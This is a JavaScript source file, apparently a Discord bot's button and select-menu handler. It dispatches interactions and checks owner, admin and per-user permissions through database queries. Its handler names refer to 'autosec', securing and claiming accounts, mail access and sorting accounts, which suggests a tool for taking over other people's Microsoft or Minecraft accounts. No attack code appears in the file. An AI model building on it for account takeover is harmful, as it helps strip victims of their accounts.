

const getButtons = require("../../utils/responses/getButtons");
const { queryParams } = require("../../../db/database");
const cliColor = require('cli-color');
const help = require("../../Buttons/users/help");
const isOwner = require('../../../db/isOwner')

const {
    handlesecureconfig,
    handlefeatures,
    handleprofilesplit,
    handleSortAccounts,
    handlePanelSwitch,
    handlePingToggle,
    handlePrimaryCycle,
    handleAfterSecureSelect,
    checkBlacklist,
    showembeds,
    handlechangeusers,
    handleclaimmodal
} = require("../../Handlers/buttons/buttonhandlerautosec");
const { EmbedBuilder } = require("discord.js");
const userpermissions = require("../../utils/embeds/userpermissions");




module.exports = async (client, interaction) => {


    const [userperms] = await userpermissions();
    if (!interaction.isButton() && !interaction.isStringSelectMenu()) return;
    
    if (await checkBlacklist(interaction)) return;

    if (interaction.isStringSelectMenu()) {
        const [action, ...params] = interaction.customId.split("|");
        
        if (action === 'profiles') {
            await handleprofilesplit(client, interaction);
            return;
        } else if (action === 'toggleconfig') {
            await handlesecureconfig(interaction);
            return;
        } else if (action === 'unclaimed_select') {
            await handleclaimmodal(client, interaction);
            return;
        } else if (action === 'after_secure_state') {
            await handleAfterSecureSelect(client, interaction);
            return;
        } else if (action === 'sort_accounts') {
            await handleSortAccounts(client, interaction, params);
            return;
        } else if (action === 'embeds') {
            await showembeds(client, interaction, client.username);
            return;
        } 
        
        /*
    else if (action === 'usersettings') {
            await handlechangeusers(client, interaction, params);
            return;
        }
            */
    }

try {
    let button;
    const [action, param, value] = interaction.customId.split("|");


    if (action === "settings") {
        await handleSettingsButton(client, interaction, param, value);
        return;
    } else if (action === "switch_to_admin" || action === "switch_to_features") {
        await handlePanelSwitch(client, interaction, action);
        return;
    } else if (action === "toggle_ping") {
        await handlePingToggle(client, interaction);
        return;
    } else if (action === "cycle_primary") {
        await handlePrimaryCycle(client, interaction);
        return;
    } else if (action === "microsoft") {
        await interaction.reply({
            content: `Deprecated`,
            ephemeral: true
        });
        return;
    } else if (action === "action") {
        let actionData = await client.queryParams(`SELECT * FROM actions WHERE id=?`, [param]);
        if (actionData.length === 0) {
            return interaction.reply({
                embeds: [{
                    title: `Error :x:`,
                    description: `Please try again later!`,
                    color: 0xff0000,
                }],
                ephemeral: true,
            });
        }
        interaction.customId = actionData[0].action;
        button = client.buttons.find((btn) => btn.name === interaction.customId.split("|")[0]);
    } else if (action === "help") {
        await help.execute(interaction);
        return;
    } else {
        button = client.buttons.find((btn) => btn.name === action);
    }

    if (!button) {
        console.log(`Couldn't find button for action: ${action}`);
        console.log(`Available buttons: ${client.buttons.map(b => b.name).join(', ')}`);
        return interaction.reply({
            content: `Button handler not found for "${action}". Please contact support.`,
            ephemeral: true
        });
    }
        if (!button.callback) {
            return interaction.reply({
                content: `This button does not have a valid action assigned.`,
                ephemeral: true
            });
        }


        if (button.mail && client.username !== interaction.user.id) {
            let users = await client.queryParams(`SELECT * FROM users WHERE user_id=? AND child=?`, [client.username, interaction.user.id]);
            if (users.length === 0) {
                return interaction.reply({ content: `You don't have access to mails! (no license / user of a bot)`, ephemeral: true });
            }
        }
        
        /*
        User permissions
        */
for (const [buttonProp, { permission: dbPermission, description }] of Object.entries(userperms)) {
    if (button[buttonProp] && interaction.user.id !== client.username) {
        let users = await client.queryParams(
            `SELECT * FROM users WHERE user_id=? AND child=?`,
            [client.username, interaction.user.id]
        );

        if (users.length === 0 || users[0][dbPermission] !== 1) {
            if (users.length === 0) {
                return interaction.reply({
                    content: `Invalid permissions!`,
                    ephemeral: true,
                });
            }

            let msg = new EmbedBuilder()
                .setTitle('You do not have permissions for that!')
                .setDescription(`You need to have the \`${description}\` permission for that!`)
                .setColor('#cc2f21');

            return interaction.reply({ embeds: [msg], ephemeral: true });
        }
    }
}




        /// Main permissions

        
        if (button.adminOnly) {
            let users = await client.queryParams(`SELECT * FROM users WHERE user_id=? AND child=?`, [client.username, interaction.user.id]);
            if ((users.length === 0 || !users[0]?.admin) && client.username !== interaction.user.id) {
                console.log(`Deprecated!`)
                return interaction.reply({ content: `Invalid permissions!`, ephemeral: true });
            }
        }

        /*
        Same thing
        */
        if (button.ownerOnly && interaction.user.id !== client.username) {
            console.log(`Failed owneronly! User: ${interaction.user.id}, Owner: ${client.username}`);
            return interaction.reply({ 
                content: `Invalid permissions! This action is restricted to the bot owner.`, 
                ephemeral: true 
            });
        }
        
        if (button.userOnly && interaction.user.id !== client.username) {
            console.log(`Failed useronly!`)
            return interaction.reply({ content: `Invalid permissions!`, ephemeral: true });
        }
        
        console.log(`B]${cliColor.yellow(button.name)} ${cliColor.blue(interaction.user.username)} ${cliColor.red(interaction.customId)}`);
        await button.callback(client, interaction);
    } catch (e) {
        console.error(e);
    }
};